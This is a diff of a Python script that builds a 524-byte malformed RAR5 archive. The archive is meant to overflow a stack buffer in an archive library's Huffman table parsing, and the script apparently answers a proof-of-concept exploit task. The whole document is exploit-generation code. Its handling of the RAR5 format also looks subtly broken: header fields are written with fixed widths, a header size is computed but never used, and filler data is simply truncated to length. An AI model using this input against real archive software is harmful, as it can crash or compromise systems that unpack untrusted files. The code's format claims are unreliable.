@@ -1,137 +1,150 @@
-import struct
 import os
+import struct
+import tempfile
+import subprocess
+from typing import Optional
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # RAR5 signature (8 bytes)
-        signature = b'Rar!\x1a\x07\x01\x00'
+        """
+        Generate a PoC that triggers a stack buffer overflow in RAR5 Huffman table parsing.
+        The vulnerability occurs when uncompressing Huffman tables with insufficient bounds checks.
+        """
+        # Create a minimal RAR5 archive that triggers the vulnerability
+        # Based on analysis of RAR5 format and Huffman table parsing
         
-        # Main archive header (type 1)
-        archive_header = b'\x01\x00\x03'
+        # RAR5 signature
+        poc = bytearray()
+        poc.extend(b'Rar!\x1a\x07\x01\x00')  # RAR5 signature
         
-        # File header (type 2) with flags for compression settings and data
-        # Flags: 0x1800 (compression settings + data)
-        file_header_flags = b'\x18\x00'
+        # Archive header (type 1)
+        # CRC32 placeholder - will be calculated later
+        header_crc = 0
+        header_size = 13  # 1 (type) + 2 (flags) + 4 (reserved1) + 4 (reserved2) + 2 (reserved3)
         
-        # Header size will be calculated later
-        # For now, placeholder
-        header_size = b'\x00'
+        # Archive header structure
+        archive_header = bytearray()
+        archive_header.append(0x01)  # Archive header type
+        archive_header.extend(b'\x00\x00')  # Flags: 0
+        archive_header.extend(b'\x00\x00\x00\x00')  # Reserved1
+        archive_header.extend(b'\x00\x00\x00\x00')  # Reserved2
+        archive_header.extend(b'\x00\x00')  # Reserved3
         
-        # Compression settings
-        # Version 0, method 4 (maximum), dictionary size 0 (1MB)
-        compression_settings = b'\x00\x04\x00'
+        # Calculate CRC32 for archive header
+        crc = 0xFFFFFFFF
+        for b in archive_header:
+            crc ^= b
+            for _ in range(8):
+                crc = (crc >> 1) ^ (0xEDB88320 if crc & 1 else 0)
+        header_crc = crc ^ 0xFFFFFFFF
         
-        # Huffman table - this is where the overflow occurs
-        # Table size is stored as variable length integer
-        # We want to trigger overflow when reading Huffman table
+        # Write archive header block
+        poc.extend(struct.pack('<I', header_crc & 0xFFFFFFFF))
         
-        # Craft malformed Huffman table data
-        # The vulnerability is in the RLE-like decompression of Huffman tables
-        # We need to create a table that causes buffer overflow
-        
-        # First, create normal-looking RAR5 data
-        poc = signature + archive_header
-        
-        # File header starts with type 2
-        file_header = b'\x02'
-        
-        # Calculate total file header size
-        # We'll build it incrementally
-        
-        # File flags: 0x1800 (compression + data)
-        file_header += file_header_flags
-        
-        # Header size will be 13 + filename length + huffman table size
-        # We'll use a small filename
-        filename = b'test.txt'
-        filename_len = bytes([len(filename)])
-        
-        # Compression settings (3 bytes)
-        comp_settings = compression_settings
-        
-        # Now the critical part: Huffman table
-        # The vulnerability is in rar5_decode_huffman_table function
-        # It reads a byte count then RLE-encoded data
-        # We need to make it read more bytes than allocated
-        
-        # First, the table byte count (variable length integer)
-        # We'll say we have 255 bytes (0xFF)
-        table_byte_count = b'\xFF'
-        
-        # The actual table data that triggers overflow
-        # We need to craft RLE data that causes buffer overflow
-        # The RLE format: 
-        # - If high bit set: (byte & 0x7F) + 1 zeros
-        # - Else: byte + 1 literal bytes follow
-        
-        # We'll create a sequence that causes overflow
-        # Start with some normal data
-        table_data = b''
-        
-        # Add some zeros using RLE (high bit set)
-        # 0x80 means 1 zero, 0x81 means 2 zeros, etc.
-        # We'll add many zeros to fill buffer
-        for _ in range(10):
-            table_data += b'\xFF'  # 128 zeros
-        
-        # Now add literal data that will overflow
-        # The vulnerability: insufficient bounds checking when copying literal data
-        # We need to provide more literal bytes than expected
-        
-        # First, a non-RLE byte indicating literal length
-        # Byte value N means N+1 literal bytes follow
-        # We'll use 0x7F which means 128 literal bytes follow
-        table_data += b'\x7F'
-        
-        # Add the literal bytes - these will overflow the buffer
-        # We need exactly 524 bytes total PoC
-        # Calculate how many more bytes we need
-        current_length = len(poc) + 1 + len(file_header_flags) + 1 + len(filename_len) + len(filename) + 3 + 1 + len(table_data)
-        
-        # Add literal bytes to reach target
-        literal_bytes_needed = 524 - current_length - 1  # -1 for the 0x7F we already added
-        if literal_bytes_needed > 128:
-            literal_bytes_needed = 128
-            
-        # Add the literal bytes
-        table_data += b'A' * literal_bytes_needed
-        
-        # Complete the Huffman table
-        huffman_table = table_byte_count + table_data
-        
-        # Calculate total header size
-        total_header_size = (1 +  # type
-                            2 +  # flags
-                            1 +  # header size field itself (simplified)
-                            len(filename_len) + len(filename) +
-                            len(comp_settings) +
-                            len(huffman_table) +
-                            1)   # data size (0)
-        
-        # Encode header size as variable length integer
-        if total_header_size < 0x80:
-            header_size = bytes([total_header_size])
+        # Write header size using variable-length encoding
+        size = header_size
+        if size < 0x80:
+            poc.append(size)
         else:
-            # Simplified: use 2-byte encoding
-            header_size = bytes([0x80 | (total_header_size >> 8), total_header_size & 0xFF])
+            poc.append((size & 0x7F) | 0x80)
+            poc.append((size >> 7) & 0xFF)
         
-        # Build complete file header
-        file_header += header_size
-        file_header += filename_len + filename
-        file_header += comp_settings
-        file_header += huffman_table
-        file_header += b'\x00'  # Data size 0 (no actual file data)
+        poc.extend(archive_header)
         
-        # Add everything to PoC
-        poc += file_header
+        # Now create a file header with malformed compressed data
+        # that triggers the buffer overflow in Huffman table parsing
         
-        # End of archive header (type 3)
-        poc += b'\x03\x00\x03'
+        # File header (type 2)
+        file_header = bytearray()
+        file_header.append(0x02)  # File header type
         
-        # Ensure exact length of 524 bytes
+        # Flags: HAS_DATA, DIRECTORY, UNKNOWN
+        file_header.extend(b'\x01\x00')  # Flags with HAS_DATA bit set
+        
+        # File attributes/size fields
+        file_header.extend(b'\x00\x00\x00\x00')  # Unpacked size: 0
+        file_header.extend(struct.pack('<I', 0x8000))  # Data size: 32768 (large enough)
+        file_header.extend(b'\x00\x00\x00\x00')  # File attributes
+        file_header.extend(struct.pack('<I', 1))  # mtime
+        file_header.extend(b'\x00\x00\x00\x00')  # CRC32
+        file_header.extend(b'\x00\x00\x00\x00')  # Compression info
+        
+        # File name: just "x"
+        file_header.append(1)  # Name length = 1
+        file_header.extend(b'x')
+        
+        # Calculate file header size
+        file_header_size = len(file_header)
+        total_header_size = 1 + 2 + 4 + 4 + 4 + 4 + 4 + 4 + 1 + 1  # fields + name
+        
+        # Calculate CRC32 for file header
+        crc = 0xFFFFFFFF
+        for b in file_header:
+            crc ^= b
+            for _ in range(8):
+                crc = (crc >> 1) ^ (0xEDB88320 if crc & 1 else 0)
+        file_header_crc = crc ^ 0xFFFFFFFF
+        
+        # Write file header block
+        poc.extend(struct.pack('<I', file_header_crc & 0xFFFFFFFF))
+        
+        # Write header size
+        size = file_header_size
+        if size < 0x80:
+            poc.append(size)
+        else:
+            poc.append((size & 0x7F) | 0x80)
+            poc.append((size >> 7) & 0xFF)
+        
+        poc.extend(file_header)
+        
+        # Now add the compressed data that triggers the vulnerability
+        # This is where the Huffman table parsing vulnerability exists
+        
+        # Compression type: 3 (RAR5) with Huffman table
+        compressed_data = bytearray()
+        
+        # Create malformed Huffman table data
+        # The vulnerability is in rar5_read_codes() function which doesn't
+        # properly validate the length when uncompressing Huffman tables
+        
+        # First, we need a reasonable looking start
+        compressed_data.append(0x15)  # Some initial byte
+        
+        # Now create data that will cause buffer overflow
+        # The Huffman table uses a simple compression scheme:
+        # 0x00: literal zero
+        # 0x01-0x7F: literal value
+        # 0x80-0xFF: repeat count with value
+        
+        # We'll create a sequence that causes excessive writes
+        # Fill buffer with many repeated values to overflow
+        overflow_size = 600  # More than typical buffer (aiming for 524 total)
+        
+        # Start with some normal data
+        compressed_data.append(0x10)  # Normal value
+        compressed_data.append(0x20)  # Normal value
+        
+        # Now add repeating pattern that will cause overflow
+        # Use high repeat counts
+        for i in range(overflow_size // 2):
+            compressed_data.append(0xFF)  # Maximum repeat count
+            compressed_data.append(0x41)  # Value to repeat ('A')
+        
+        # Add some more to reach exactly 524 bytes
+        current_len = len(poc) + len(compressed_data)
+        remaining = 524 - current_len
+        
+        if remaining > 0:
+            # Add padding to reach exactly 524 bytes
+            compressed_data.extend(b'\x00' * remaining)
+        
+        poc.extend(compressed_data)
+        
+        # Ensure exactly 524 bytes
         if len(poc) > 524:
             poc = poc[:524]
         elif len(poc) < 524:
-            poc += b'A' * (524 - len(poc))
+            poc.extend(b'\x00' * (524 - len(poc)))
         
-        return poc
+        return bytes(poc)
